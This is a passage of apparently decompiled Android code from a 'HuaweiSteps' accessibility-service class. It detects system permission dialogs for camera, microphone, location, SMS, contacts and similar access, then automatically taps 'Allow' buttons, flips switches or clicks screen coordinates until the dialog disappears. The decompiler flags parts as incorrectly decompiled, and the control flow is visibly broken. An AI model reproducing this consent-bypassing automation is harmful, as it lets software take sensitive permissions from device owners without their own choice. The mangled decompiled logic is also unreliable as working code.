    /* renamed from: e4 */
    public static final void m212153e4(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        if (accessibilityNodeInfo == null) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        String string2 = (text == null || (string = text.toString()) == null) ? null : AbstractC0779a1.m213687e0(string).toString();
        if (string2 != null && string2.length() != 0) {
            arrayList.add(string2);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            m212153e4(accessibilityNodeInfo.getChild(i), arrayList);
        }
    }

    /* renamed from: e6 */
    public static final void m212154e6(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        if (accessibilityNodeInfo == null) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        String string2 = (text == null || (string = text.toString()) == null) ? null : AbstractC0779a1.m213687e0(string).toString();
        if (string2 != null && string2.length() != 0) {
            arrayList.add(string2);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            m212154e6(accessibilityNodeInfo.getChild(i), arrayList);
        }
    }

    /* renamed from: e9 */
    public static boolean m212155e9(String str) {
        if (str.length() != 0) {
            String[] strArr = {"是否允许", "允许", "权限", "拍摄照片", "录制视频", "访问", "拍摄", "录制", "麦克风", "位置", "存储", "相册", "通讯录", "短信", "SMS", "电话", "Phone", "日历", "Calendar", "传感器", "Sensors", "蓝牙", "Bluetooth"};
            for (int i = 0; i < 23; i++) {
                if (AbstractC0779a1.m213652a5(str, strArr[i], false)) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: g5 */
    public static void m212156g5() {
        int i = 500;
        while (i > 0) {
            int iMin = Math.min(i, 100);
            SystemClock.sleep(iMin);
            i -= iMin;
        }
    }

    /* renamed from: a0 */
    public final boolean m212157a0(String str) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        if (rootInActiveWindow != null && (listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str)) != null) {
            for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                if (accessibilityNodeInfo.isVisibleToUser()) {
                    if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
                        t60.m214704c5("HuaweiSteps", "[clickAppInList] 直接点击成功");
                        return true;
                    }
                    AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                    for (int i = 0; parent != null && i < 5; i++) {
                        if (parent.isClickable() && parent.performAction(16)) {
                            tz0.m214806a6("[clickAppInList] 点击父节点成功 (level=", i, ")", "HuaweiSteps");
                            return true;
                        }
                        parent = parent.getParent();
                    }
                    if (m212198f5(accessibilityNodeInfo)) {
                        t60.m214704c5("HuaweiSteps", "[clickAppInList] 坐标点击成功");
                        return true;
                    }
                }
            }
        }
        return false;
    }

    /* renamed from: a1 */
    public final boolean m212158a1() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        AccessibilityNodeInfo accessibilityNodeInfoM212177c8 = m212177c8(rootInActiveWindow);
        if (accessibilityNodeInfoM212177c8 != null) {
            t60.m214704c5("HuaweiSteps", "[clickFirstSwitch] 找到开关，当前状态: " + accessibilityNodeInfoM212177c8.isChecked());
            if (accessibilityNodeInfoM212177c8.performAction(16)) {
                t60.m214704c5("HuaweiSteps", "[clickFirstSwitch] ✅ 点击成功");
                return true;
            }
        }
        t60.m214704c5("HuaweiSteps", "[clickFirstSwitch] ❌ 未找到开关");
        return false;
    }

    /* renamed from: a2 */
    public final void m212159a2() throws InterruptedException {
        AccessibilityService accessibilityService = this.f55063a1;
        AccessibilityNodeInfo rootInActiveWindow = accessibilityService.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return;
        }
        ArrayList arrayList = new ArrayList();
        m212151d0(rootInActiveWindow, arrayList);
        t60.m214704c5("HuaweiSteps", "[clickFirstUncheckedSwitch] 找到 " + arrayList.size() + " 个开关");
        int size = arrayList.size();
        int i = 0;
        while (i < size) {
            Object obj = arrayList.get(i);
            i++;
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) obj;
            if (!accessibilityNodeInfo.isChecked()) {
                Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
                float fCenterX = rectM24a5.centerX();
                float fCenterY = rectM24a5.centerY();
                t60.m214704c5("HuaweiSteps", AbstractC0003a2.m29b0("[clickFirstUncheckedSwitch] 点击开关: (", fCenterX, ", ", fCenterY, ")"));
                Path path = new Path();
                path.moveTo(fCenterX, fCenterY);
                GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L)).build();
                CountDownLatch countDownLatch = new CountDownLatch(1);
                if (accessibilityService.dispatchGesture(gestureDescriptionBuild, new C0619ie(new Ref$BooleanRef(), countDownLatch, 1), null)) {
                    try {
                        countDownLatch.await(500L, TimeUnit.MILLISECONDS);
                        return;
                    } catch (Exception e) {
                        tz0.m214807a7("[clickFirstUncheckedSwitch] 等待超时: ", e.getMessage(), "HuaweiSteps");
                        return;
                    }
                }
                return;
            }
        }
    }

    /* renamed from: a3 */
    public final boolean m212160a3(String str, boolean z) {
        String string;
        String string2;
        AccessibilityNodeInfo rootInActiveWindow = this.f55063a1.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
        String string3 = AbstractC0779a1.m213687e0(str).toString();
        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
            if (accessibilityNodeInfo.isVisibleToUser()) {
                CharSequence text = accessibilityNodeInfo.getText();
                if (text == null || (string2 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string2).toString()) == null) {
                    string = "";
                }
                if ((z ? string.equals(string3) : AbstractC0779a1.m213652a5(string, string3, false) || AbstractC0779a1.m213652a5(string3, string, false)) && m212198f5(accessibilityNodeInfo)) {
                    t60.m214704c5("HuaweiSteps", "[clickText] ✅ 点击: " + str + " (精确=" + z + ")");
                    return true;
                }
            }
        }
        t60.m214704c5("HuaweiSteps", "[clickText] ❌ 未找到: ".concat(str));
        return false;
    }

    /* JADX WARN: Code restructure failed: missing block: B:107:0x035b, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L108;
     */
    /* JADX WARN: Removed duplicated region for block: B:106:0x0317 A[Catch: Exception -> 0x02ab, TryCatch #1 {Exception -> 0x02ab, blocks: (B:109:0x035e, B:111:0x0364, B:104:0x0311, B:106:0x0317, B:115:0x0370, B:113:0x036a, B:98:0x02cf, B:100:0x02d5, B:103:0x02dd, B:117:0x0378, B:83:0x027b, B:85:0x0281, B:87:0x028d, B:93:0x02b3, B:78:0x0261, B:80:0x026b, B:82:0x0271, B:94:0x02b8, B:71:0x0231, B:73:0x0237, B:76:0x023f, B:119:0x037e, B:63:0x0205, B:65:0x020b, B:68:0x0213, B:121:0x0384, B:54:0x0193, B:56:0x0199, B:59:0x01a1, B:123:0x038a, B:50:0x014f), top: B:130:0x014f }] */
    /* JADX WARN: Removed duplicated region for block: B:115:0x0370 A[Catch: Exception -> 0x02ab, TryCatch #1 {Exception -> 0x02ab, blocks: (B:109:0x035e, B:111:0x0364, B:104:0x0311, B:106:0x0317, B:115:0x0370, B:113:0x036a, B:98:0x02cf, B:100:0x02d5, B:103:0x02dd, B:117:0x0378, B:83:0x027b, B:85:0x0281, B:87:0x028d, B:93:0x02b3, B:78:0x0261, B:80:0x026b, B:82:0x0271, B:94:0x02b8, B:71:0x0231, B:73:0x0237, B:76:0x023f, B:119:0x037e, B:63:0x0205, B:65:0x020b, B:68:0x0213, B:121:0x0384, B:54:0x0193, B:56:0x0199, B:59:0x01a1, B:123:0x038a, B:50:0x014f), top: B:130:0x014f }] */
    /* JADX WARN: Removed duplicated region for block: B:61:0x0201  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x0203  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x022f  */
    /* JADX WARN: Removed duplicated region for block: B:73:0x0237 A[Catch: Exception -> 0x02ab, TryCatch #1 {Exception -> 0x02ab, blocks: (B:109:0x035e, B:111:0x0364, B:104:0x0311, B:106:0x0317, B:115:0x0370, B:113:0x036a, B:98:0x02cf, B:100:0x02d5, B:103:0x02dd, B:117:0x0378, B:83:0x027b, B:85:0x0281, B:87:0x028d, B:93:0x02b3, B:78:0x0261, B:80:0x026b, B:82:0x0271, B:94:0x02b8, B:71:0x0231, B:73:0x0237, B:76:0x023f, B:119:0x037e, B:63:0x0205, B:65:0x020b, B:68:0x0213, B:121:0x0384, B:54:0x0193, B:56:0x0199, B:59:0x01a1, B:123:0x038a, B:50:0x014f), top: B:130:0x014f }] */
    /* JADX WARN: Removed duplicated region for block: B:78:0x0261 A[Catch: Exception -> 0x02ab, TryCatch #1 {Exception -> 0x02ab, blocks: (B:109:0x035e, B:111:0x0364, B:104:0x0311, B:106:0x0317, B:115:0x0370, B:113:0x036a, B:98:0x02cf, B:100:0x02d5, B:103:0x02dd, B:117:0x0378, B:83:0x027b, B:85:0x0281, B:87:0x028d, B:93:0x02b3, B:78:0x0261, B:80:0x026b, B:82:0x0271, B:94:0x02b8, B:71:0x0231, B:73:0x0237, B:76:0x023f, B:119:0x037e, B:63:0x0205, B:65:0x020b, B:68:0x0213, B:121:0x0384, B:54:0x0193, B:56:0x0199, B:59:0x01a1, B:123:0x038a, B:50:0x014f), top: B:130:0x014f }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x0281 A[Catch: Exception -> 0x02ab, TryCatch #1 {Exception -> 0x02ab, blocks: (B:109:0x035e, B:111:0x0364, B:104:0x0311, B:106:0x0317, B:115:0x0370, B:113:0x036a, B:98:0x02cf, B:100:0x02d5, B:103:0x02dd, B:117:0x0378, B:83:0x027b, B:85:0x0281, B:87:0x028d, B:93:0x02b3, B:78:0x0261, B:80:0x026b, B:82:0x0271, B:94:0x02b8, B:71:0x0231, B:73:0x0237, B:76:0x023f, B:119:0x037e, B:63:0x0205, B:65:0x020b, B:68:0x0213, B:121:0x0384, B:54:0x0193, B:56:0x0199, B:59:0x01a1, B:123:0x038a, B:50:0x014f), top: B:130:0x014f }] */
    /* JADX WARN: Removed duplicated region for block: B:94:0x02b8 A[Catch: Exception -> 0x02ab, TryCatch #1 {Exception -> 0x02ab, blocks: (B:109:0x035e, B:111:0x0364, B:104:0x0311, B:106:0x0317, B:115:0x0370, B:113:0x036a, B:98:0x02cf, B:100:0x02d5, B:103:0x02dd, B:117:0x0378, B:83:0x027b, B:85:0x0281, B:87:0x028d, B:93:0x02b3, B:78:0x0261, B:80:0x026b, B:82:0x0271, B:94:0x02b8, B:71:0x0231, B:73:0x0237, B:76:0x023f, B:119:0x037e, B:63:0x0205, B:65:0x020b, B:68:0x0213, B:121:0x0384, B:54:0x0193, B:56:0x0199, B:59:0x01a1, B:123:0x038a, B:50:0x014f), top: B:130:0x014f }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:107:0x035b -> B:109:0x035e). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:79:0x0269 -> B:93:0x02b3). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:81:0x026f -> B:93:0x02b3). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:82:0x0271 -> B:83:0x027b). Please report as a decompilation issue!!! */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Enum m212161a8(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$detectAndClickHonorPermissionDialog$1 huaweiSteps$detectAndClickHonorPermissionDialog$1;
        HuaweiSteps$HonorClickResult huaweiSteps$HonorClickResult;
        String string;
        String str;
        j40 j40VarM212152d3;
        HuaweiSteps$HonorClickResult huaweiSteps$HonorClickResult2;
        C0365a2 c0365a2;
        String strM212179d2;
        String str2;
        C0365a2 c0365a22;
        String strM212179d22;
        String strM212179d23;
        String[] strArr;
        int i;
        int i2;
        C0365a2 c0365a23;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        String str3;
        int i3;
        C0365a2 c0365a24;
        int i4;
        Iterator it;
        String[] strArr2;
        String strM212179d24;
        C0365a2 c0365a25;
        Iterator it2;
        String str4;
        int i5;
        if (continuationImpl instanceof HuaweiSteps$detectAndClickHonorPermissionDialog$1) {
            huaweiSteps$detectAndClickHonorPermissionDialog$1 = (HuaweiSteps$detectAndClickHonorPermissionDialog$1) continuationImpl;
            int i6 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53994a8;
            if ((i6 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$detectAndClickHonorPermissionDialog$1.f53994a8 = i6 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$detectAndClickHonorPermissionDialog$1 = new HuaweiSteps$detectAndClickHonorPermissionDialog$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53992a6;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i7 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53994a8;
        HuaweiSteps$HonorClickResult huaweiSteps$HonorClickResult3 = HuaweiSteps$HonorClickResult.f53974a1;
        HuaweiSteps$HonorClickResult huaweiSteps$HonorClickResult4 = HuaweiSteps$HonorClickResult.f53973a0;
        try {
            switch (i7) {
                case 0:
                    kg1.m213544f4(obj);
                    List<AccessibilityWindowInfo> windows = this.f55063a1.getWindows();
                    if (windows != null) {
                        Iterator<AccessibilityWindowInfo> it3 = windows.iterator();
                        while (it3.hasNext()) {
                            CharSequence title = it3.next().getTitle();
                            if (title == null || (string = title.toString()) == null) {
                                string = "";
                            }
                            str = string;
                            if (m212155e9(str)) {
                                t60.m214704c5("HuaweiSteps", "[荣耀权限] 检测到弹窗: " + str);
                                j40VarM212152d3 = m212152d3(str);
                                float f = j40VarM212152d3.f57260a0;
                                t60.m214704c5("HuaweiSteps", "[荣耀权限] " + j40VarM212152d3.f57264a4);
                                t60.m214704c5("HuaweiSteps", "[荣耀权限] 屏幕尺寸: " + m212181d5() + "x" + m212180d4());
                                int iM212181d5 = (int) (((float) m212181d5()) * f);
                                float fM212180d4 = (float) m212180d4();
                                float f2 = j40VarM212152d3.f57261a1;
                                int i8 = (int) (fM212180d4 * f2);
                                float f3 = 100;
                                int i9 = (int) (f * f3);
                                int i10 = (int) (f3 * f2);
                                huaweiSteps$HonorClickResult = huaweiSteps$HonorClickResult3;
                                try {
                                    StringBuilder sb = new StringBuilder();
                                    huaweiSteps$HonorClickResult2 = huaweiSteps$HonorClickResult4;
                                    sb.append("[荣耀权限] 主坐标: (");
                                    sb.append(i9);
                                    sb.append("%, ");
                                    sb.append(i10);
                                    sb.append("%) → (");
                                    sb.append(iM212181d5);
                                    sb.append(", ");
                                    sb.append(i8);
                                    sb.append(")");
                                    t60.m214704c5("HuaweiSteps", sb.toString());
                                    m212202f9(iM212181d5, i8);
                                    huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0 = this;
                                    huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1 = str;
                                    huaweiSteps$detectAndClickHonorPermissionDialog$1.f53988a2 = j40VarM212152d3;
                                    huaweiSteps$detectAndClickHonorPermissionDialog$1.f53994a8 = 1;
                                    if (b81.m210571b1(100L, huaweiSteps$detectAndClickHonorPermissionDialog$1) == coroutineSingletons) {
                                        return coroutineSingletons;
                                    }
                                    c0365a2 = this;
                                    strM212179d2 = c0365a2.m212179d2();
                                    if (strM212179d2 != null && strM212179d2.equals(str)) {
                                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 主坐标点击无效，弹窗未变化，尝试备用坐标...");
                                        int iM212181d52 = (int) (c0365a2.m212181d5() * j40VarM212152d3.f57262a2);
                                        float fM212180d42 = c0365a2.m212180d4();
                                        float f4 = j40VarM212152d3.f57263a3;
                                        int i11 = (int) (fM212180d42 * f4);
                                        float f5 = 100;
                                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 备用坐标: (" + ((int) (j40VarM212152d3.f57262a2 * f5)) + "%, " + ((int) (f4 * f5)) + "%) → (" + iM212181d52 + ", " + i11 + ")");
                                        c0365a2.m212202f9((float) iM212181d52, (float) i11);
                                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0 = c0365a2;
                                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1 = str;
                                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53988a2 = null;
                                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53994a8 = 2;
                                        if (b81.m210571b1(100L, huaweiSteps$detectAndClickHonorPermissionDialog$1) != coroutineSingletons) {
                                            return coroutineSingletons;
                                        }
                                        str2 = str;
                                        c0365a22 = c0365a2;
                                        strM212179d22 = c0365a22.m212179d2();
                                        if (strM212179d22 != null && strM212179d22.equals(str2)) {
                                            t60.m214704c5("HuaweiSteps", "[荣耀权限] 主备坐标都无效，尝试所有模式...");
                                            t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式1: 遍历开关");
                                            c0365a22.m212159a2();
                                            huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0 = c0365a22;
                                            huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1 = str2;
                                            huaweiSteps$detectAndClickHonorPermissionDialog$1.f53994a8 = 3;
                                            if (b81.m210571b1(100L, huaweiSteps$detectAndClickHonorPermissionDialog$1) == coroutineSingletons) {
                                                return coroutineSingletons;
                                            }
                                            strM212179d23 = c0365a22.m212179d2();
                                            if (strM212179d23 != null && strM212179d23.equals(str2)) {
                                                t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式2: 点击允许文本");
                                                strArr = new String[]{"允许", "始终允许", "仅在使用中允许", "确定", "同意", "Allow", "Allow always", "While using the app", "OK", "Agree"};
                                                i = 10;
                                                i2 = 0;
                                                if (i2 >= i) {
                                                    String str5 = strArr[i2];
                                                    AccessibilityNodeInfo rootInActiveWindow = c0365a22.f55063a1.getRootInActiveWindow();
                                                    if (rootInActiveWindow != null && (listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str5)) != null) {
                                                        str3 = str2;
                                                        i3 = i;
                                                        c0365a24 = c0365a22;
                                                        i4 = i2;
                                                        it = listFindAccessibilityNodeInfosByText.iterator();
                                                        strArr2 = strArr;
                                                        while (it.hasNext()) {
                                                            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) it.next();
                                                            if (accessibilityNodeInfo.isClickable()) {
                                                                accessibilityNodeInfo.performAction(16);
                                                                huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0 = c0365a24;
                                                                huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1 = str3;
                                                                huaweiSteps$detectAndClickHonorPermissionDialog$1.f53988a2 = strArr2;
                                                                huaweiSteps$detectAndClickHonorPermissionDialog$1.f53989a3 = it;
                                                                huaweiSteps$detectAndClickHonorPermissionDialog$1.f53990a4 = i4;
                                                                huaweiSteps$detectAndClickHonorPermissionDialog$1.f53991a5 = i3;
                                                                huaweiSteps$detectAndClickHonorPermissionDialog$1.f53994a8 = 4;
                                                                if (b81.m210571b1(100L, huaweiSteps$detectAndClickHonorPermissionDialog$1) == coroutineSingletons) {
                                                                    return coroutineSingletons;
                                                                }
                                                            }
                                                        }
                                                        i = i3;
                                                        i2 = i4;
                                                        strArr = strArr2;
                                                        str2 = str3;
                                                        c0365a22 = c0365a24;
                                                    }
                                                    i2++;
                                                    if (i2 >= i) {
                                                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0 = c0365a22;
                                                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1 = str2;
                                                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53988a2 = null;
                                                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53989a3 = null;
                                                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53994a8 = 5;
                                                        if (b81.m210571b1(100L, huaweiSteps$detectAndClickHonorPermissionDialog$1) == coroutineSingletons) {
                                                            return coroutineSingletons;
                                                        }
                                                        c0365a23 = c0365a22;
                                                        strM212179d24 = c0365a23.m212179d2();
                                                        if (strM212179d24 != null && strM212179d24.equals(str2)) {
                                                            t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式3: 底部区域扫描点击");
                                                            int iM212180d4 = (int) (c0365a23.m212180d4() * 0.92f);
                                                            c0365a25 = c0365a23;
                                                            it2 = AbstractC0716jf.m213306g5(new Float(0.25f), new Float(0.5f), new Float(0.75f)).iterator();
                                                            str4 = str2;
                                                            i5 = iM212180d4;
                                                            if (!it2.hasNext()) {
                                                                t60.m214704c5("HuaweiSteps", "[荣耀权限] 所有模式都无效");
                                                                return HuaweiSteps$HonorClickResult.f53975a2;
                                                            }
                                                            int iM212181d53 = (int) (c0365a25.m212181d5() * ((Number) it2.next()).floatValue());
                                                            t60.m214704c5("HuaweiSteps", "[荣耀权限] 点击: (" + iM212181d53 + ", " + i5 + ")");
                                                            c0365a25.m212202f9((float) iM212181d53, (float) i5);
                                                            huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0 = c0365a25;
                                                            huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1 = str4;
                                                            huaweiSteps$detectAndClickHonorPermissionDialog$1.f53988a2 = it2;
                                                            huaweiSteps$detectAndClickHonorPermissionDialog$1.f53990a4 = i5;
                                                            huaweiSteps$detectAndClickHonorPermissionDialog$1.f53994a8 = 6;
                                                            break;
                                                        }
                                                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式2有效");
                                                        return huaweiSteps$HonorClickResult2;
                                                    }
                                                }
                                            }
                                            t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式1有效");
                                            return huaweiSteps$HonorClickResult2;
                                        }
                                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 备用坐标点击有效，弹窗已变化");
                                        return huaweiSteps$HonorClickResult2;
                                    }
                                    t60.m214704c5("HuaweiSteps", "[荣耀权限] 主坐标点击有效，弹窗已变化");
                                    return huaweiSteps$HonorClickResult2;
                                } catch (Exception e) {
                                    e = e;
                                    tz0.m214807a7("[荣耀权限] 检测异常: ", e.getMessage(), "HuaweiSteps");
                                    return huaweiSteps$HonorClickResult;
                                }
                            }
                        }
                    }
                    return huaweiSteps$HonorClickResult3;
                case 1:
                    j40VarM212152d3 = (j40) huaweiSteps$detectAndClickHonorPermissionDialog$1.f53988a2;
                    str = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1;
                    c0365a2 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0;
                    kg1.m213544f4(obj);
                    huaweiSteps$HonorClickResult2 = huaweiSteps$HonorClickResult4;
                    strM212179d2 = c0365a2.m212179d2();
                    if (strM212179d2 != null) {
                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 主坐标点击无效，弹窗未变化，尝试备用坐标...");
                        int iM212181d522 = (int) (c0365a2.m212181d5() * j40VarM212152d3.f57262a2);
                        float fM212180d422 = c0365a2.m212180d4();
                        float f42 = j40VarM212152d3.f57263a3;
                        int i112 = (int) (fM212180d422 * f42);
                        float f52 = 100;
                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 备用坐标: (" + ((int) (j40VarM212152d3.f57262a2 * f52)) + "%, " + ((int) (f42 * f52)) + "%) → (" + iM212181d522 + ", " + i112 + ")");
                        c0365a2.m212202f9((float) iM212181d522, (float) i112);
                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0 = c0365a2;
                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1 = str;
                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53988a2 = null;
                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53994a8 = 2;
                        if (b81.m210571b1(100L, huaweiSteps$detectAndClickHonorPermissionDialog$1) != coroutineSingletons) {
                        }
                        break;
                    }
                    t60.m214704c5("HuaweiSteps", "[荣耀权限] 主坐标点击有效，弹窗已变化");
                    return huaweiSteps$HonorClickResult2;
                case 2:
                    str2 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1;
                    c0365a22 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0;
                    kg1.m213544f4(obj);
                    huaweiSteps$HonorClickResult2 = huaweiSteps$HonorClickResult4;
                    strM212179d22 = c0365a22.m212179d2();
                    if (strM212179d22 != null) {
                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 主备坐标都无效，尝试所有模式...");
                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式1: 遍历开关");
                        c0365a22.m212159a2();
                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0 = c0365a22;
                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1 = str2;
                        huaweiSteps$detectAndClickHonorPermissionDialog$1.f53994a8 = 3;
                        if (b81.m210571b1(100L, huaweiSteps$detectAndClickHonorPermissionDialog$1) == coroutineSingletons) {
                        }
                        strM212179d23 = c0365a22.m212179d2();
                        if (strM212179d23 != null) {
                            t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式2: 点击允许文本");
                            strArr = new String[]{"允许", "始终允许", "仅在使用中允许", "确定", "同意", "Allow", "Allow always", "While using the app", "OK", "Agree"};
                            i = 10;
                            i2 = 0;
                            if (i2 >= i) {
                            }
                            break;
                        }
                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式1有效");
                        return huaweiSteps$HonorClickResult2;
                    }
                    t60.m214704c5("HuaweiSteps", "[荣耀权限] 备用坐标点击有效，弹窗已变化");
                    return huaweiSteps$HonorClickResult2;
                case 3:
                    str2 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1;
                    c0365a22 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0;
                    kg1.m213544f4(obj);
                    huaweiSteps$HonorClickResult2 = huaweiSteps$HonorClickResult4;
                    strM212179d23 = c0365a22.m212179d2();
                    if (strM212179d23 != null) {
                    }
                    t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式1有效");
                    return huaweiSteps$HonorClickResult2;
                case 4:
                    i3 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53991a5;
                    i4 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53990a4;
                    it = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53989a3;
                    strArr2 = (String[]) huaweiSteps$detectAndClickHonorPermissionDialog$1.f53988a2;
                    str3 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1;
                    c0365a24 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0;
                    kg1.m213544f4(obj);
                    huaweiSteps$HonorClickResult2 = huaweiSteps$HonorClickResult4;
                    while (it.hasNext()) {
                    }
                    i = i3;
                    i2 = i4;
                    strArr = strArr2;
                    str2 = str3;
                    c0365a22 = c0365a24;
                    i2++;
                    if (i2 >= i) {
                    }
                    break;
                case 5:
                    str2 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1;
                    c0365a23 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0;
                    kg1.m213544f4(obj);
                    huaweiSteps$HonorClickResult2 = huaweiSteps$HonorClickResult4;
                    strM212179d24 = c0365a23.m212179d2();
                    if (strM212179d24 != null) {
                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式3: 底部区域扫描点击");
                        int iM212180d42 = (int) (c0365a23.m212180d4() * 0.92f);
                        c0365a25 = c0365a23;
                        it2 = AbstractC0716jf.m213306g5(new Float(0.25f), new Float(0.5f), new Float(0.75f)).iterator();
                        str4 = str2;
                        i5 = iM212180d42;
                        if (!it2.hasNext()) {
                        }
                        break;
                    }
                    t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式2有效");
                    return huaweiSteps$HonorClickResult2;
                case 6:
                    i5 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53990a4;
                    it2 = (Iterator) huaweiSteps$detectAndClickHonorPermissionDialog$1.f53988a2;
                    str4 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53987a1;
                    c0365a25 = huaweiSteps$detectAndClickHonorPermissionDialog$1.f53986a0;
                    kg1.m213544f4(obj);
                    huaweiSteps$HonorClickResult2 = huaweiSteps$HonorClickResult4;
                    String strM212179d25 = c0365a25.m212179d2();
                    if (strM212179d25 == null || !strM212179d25.equals(str4)) {
                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 模式3有效");
                        return huaweiSteps$HonorClickResult2;
                    }
                    if (!it2.hasNext()) {
                    }
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        } catch (Exception e2) {
            e = e2;
            huaweiSteps$HonorClickResult = huaweiSteps$HonorClickResult3;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:101:0x020e, code lost:
    
        if (r2.m212167b4(r0) != r1) goto L103;
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x00d8, code lost:
    
        if (m212168b5(r0) == r1) goto L102;
     */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x00dc, code lost:
    
        r2 = r10;
     */
    /* JADX WARN: Code restructure failed: missing block: B:39:0x00e7, code lost:
    
        if (m212169b6(r0) == r1) goto L102;
     */
